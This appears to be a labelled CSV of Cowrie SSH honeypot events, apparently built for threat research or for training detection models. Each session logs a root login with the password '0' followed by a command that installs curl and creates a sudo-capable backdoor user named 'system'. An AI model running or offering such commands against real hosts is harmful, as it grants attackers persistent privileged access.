,event,session_id,session,labels
636,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:06.871537Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
637,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.184325Z"", ""username"": ""root"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
638,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.447081Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
639,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.447429Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
640,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 tMu5dqY4"", ""message"": ""CMD: openssl passwd -1 tMu5dqY4"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.447836Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
641,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 tMu5dqY4"", ""message"": ""Command not found: openssl passwd -1 tMu5dqY4"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.448363Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
642,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/501b52d8270c5144019ebdc4362ffff954a5424776ec085397320deaab2e4002 after 0.2 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""501b52d8270c5144019ebdc4362ffff954a5424776ec085397320deaab2e4002"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.599875Z"", ""ttylog"": ""var/lib/cowrie/tty/501b52d8270c5144019ebdc4362ffff954a5424776ec085397320deaab2e4002"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
643,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T04:24:07.600423Z"", ""session_id"": ""ee5c4789f244""}",ee5c4789f244,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 tMu5dqY4) system  && sudo usermod -aG sudo system ; openssl passwd -1 tMu5dqY4;,"['Initial access', 'Persistence', 'Privilege escalation']"
644,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:38695 (10.42.6.15:2222) [session: e12626694b55]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 38695.0, ""timestamp"": ""2025-08-08T16:57:40.110612Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
645,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.112081Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
646,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.125007Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
647,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.167010Z"", ""username"": ""root"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
648,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.413998Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
649,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.414620Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
650,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 S3qNEMew"", ""message"": ""CMD: openssl passwd -1 S3qNEMew"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.415243Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
651,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 S3qNEMew"", ""message"": ""Command not found: openssl passwd -1 S3qNEMew"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.416065Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
652,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/6b872250a2023d39ff617f0ede62afed4b8666025bad0bf7dc15110836fd9a7c after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""6b872250a2023d39ff617f0ede62afed4b8666025bad0bf7dc15110836fd9a7c"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.429775Z"", ""ttylog"": ""var/lib/cowrie/tty/6b872250a2023d39ff617f0ede62afed4b8666025bad0bf7dc15110836fd9a7c"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
653,"{""duration"": ""0.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.3 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T16:57:40.430735Z"", ""session_id"": ""e12626694b55""}",e12626694b55,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 S3qNEMew) system  && sudo usermod -aG sudo system ; openssl passwd -1 S3qNEMew;,"['Initial access', 'Persistence', 'Privilege escalation']"
654,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:39934 (10.42.4.33:2222) [session: 69afc1ef8aec]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 39934.0, ""timestamp"": ""2025-08-06T17:36:02.062355Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
655,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.062791Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
656,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.166744Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
657,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.480194Z"", ""username"": ""root"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
658,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.772804Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
659,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.773162Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
660,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 ga2Cdvf7"", ""message"": ""CMD: openssl passwd -1 ga2Cdvf7"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.773493Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
661,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 ga2Cdvf7"", ""message"": ""Command not found: openssl passwd -1 ga2Cdvf7"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:02.774387Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
662,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/9d758c9074f62b8731ba42ba06020c78b86eb63640337cd3efb768d2f92dd16c after 0.2 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""9d758c9074f62b8731ba42ba06020c78b86eb63640337cd3efb768d2f92dd16c"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:03.006209Z"", ""ttylog"": ""var/lib/cowrie/tty/9d758c9074f62b8731ba42ba06020c78b86eb63640337cd3efb768d2f92dd16c"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
663,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T17:36:03.007065Z"", ""session_id"": ""69afc1ef8aec""}",69afc1ef8aec,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ga2Cdvf7) system  && sudo usermod -aG sudo system ; openssl passwd -1 ga2Cdvf7;,"['Initial access', 'Persistence', 'Privilege escalation']"
664,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:4756 (10.42.4.33:2222) [session: 863648dae5aa]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 4756.0, ""timestamp"": ""2025-08-05T14:53:04.737017Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
665,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:04.737400Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
666,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:04.840829Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
667,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.333243Z"", ""username"": ""root"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
